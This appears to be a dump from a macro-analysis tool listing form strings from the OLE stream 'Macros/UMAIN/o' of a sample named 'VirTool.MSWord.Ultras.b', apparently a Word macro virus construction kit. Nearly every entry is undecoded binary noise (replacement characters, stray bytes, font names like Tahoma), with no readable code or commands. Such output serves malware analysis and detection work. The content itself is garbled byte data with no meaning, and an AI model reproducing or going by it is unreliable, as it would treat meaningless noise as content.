- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������47�.2�(,�#(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�TX�QU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ����)-�26�<?�������������IIM++-JJK���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������59�/3�)-�$(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�TX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SV����',�14�;>�������������GGK((*GGH���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������7:�04�*.�NQ�X[����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jn����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�����'+�14�;>�������������CCG##%DDF���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������9<�26�,0�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MQ�y|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����(,�15�<?�������������==@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAJ���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������;>�47�.2�������������CG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������*.�37�>A�������������447
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@T���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������=@�6:�04ǡ�����������ps�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5:�������-1�6:�AD����������zz})),
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@f���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������?B�9<�36�-1�',����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qu�������14�;>�EH����������qqs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@|���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������BE�;>�59�/3�*.����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"吒�������69�@B�JL����������eeh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������EG�>A�8;����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�"&�xz�������<?�EH�PR����������YY[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������GJ�AD�;>�������������il�#(�#(�?D�',�9=�������BE�LN�WX����������MMM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������JL�DG�>A�������������).�(,�5:�z}�-1�26�������IK�ST�]^����������22;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00ۿ��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������MO�GI�BD�=@�8;���྿�.2�.1�}ޱ��47�9<�������PQ�Z[�dev���eeh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������PQ�JL�EG�@C�<?���܎��47�37¦�����;>�@B�ij����WX�aa|``g���VVX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������Ȧ�̣�С�ӟ����쵶䜝ܜ����������գ�Ѧ����������������ˣ������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����BBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YY[���88<DDHOOT[[`eelmm|���������������OQ�MN�JL�TV����������������RS�GI�IK�KL����������������]^|bbueem������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����AAB			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rrs���336>>BJJNUUZ``feeobbu���������UV�RS�OQ�MO�LM�JL����������IK�IK�JL�LN�NO�PQ�������������`aweeq``f������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������@@R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@U�  '
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������..088<CCG���YY_ddjddq������op�WX�UV����qs�OP�MO����������LN�MN�z{����QR�ST�ab����������cdrddjWW]������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������``s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
		
��Ď��((*225==@���RRW]]beel������]^|Z[�XY������RS�QR�|}����{}�OQ�PR�}~����TV�WX�YZ����������eem[[aNNS������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ҋ��!!#++.669���KKOUUZ__d������`ax^^|[\�������UW�TU�~�����~�ST�TU�������XY�Z[�]]~���������^^cRRWEEI������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.  H���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$'//1���CCGMMQVV[������cdsaaw^_{������YZ�XY����������WX�WX�������[\^^|`ax���������TTYHHL;;?������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 00;������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'')114;;>DDHzz}������eemddqbbu������\]~[\���������Z[�[\�������_`yabvddr���������JJN>>B114������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,PPc������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!))+225TTW���������^^cddkeep������`ax_`y���������^_{__z������ccseepeek���������@@C447''*������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���**,336<<?������TTY[[`aag������ddrccs���������bbucct������eembbh[[`���������558**,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������@@t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!!#**,225������JJNQQUWW\������ddkeem���������ffoffm������]]bWW\PPU���������++.  !
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#))+������@@CFFJLLQ������ZZ_]]b���������__e]]c������RRWLLQEEI�����͢��!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !������uuw<<?BBEjjmVVZOOSQQV���������TTYRRW{{���GGKAAE;;>���**-!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L00l�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nnn���������>>A77:<<?@@DDDHiim������wwzIIMGGKssv���<<@66:003���  "
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������䉉�eeghhj��������������������������͘����������㊊�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Small Fonts
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ooqAAEDDGFFJ__b���������NNROOSOOT������PPUPPTOOT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ffh55866977:88;88;DDH������88;77:669������003--0**-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���++-++-++-���**,))+((*������""$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|||
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���""$!!#  "���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���  ,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c  {���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wpp����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
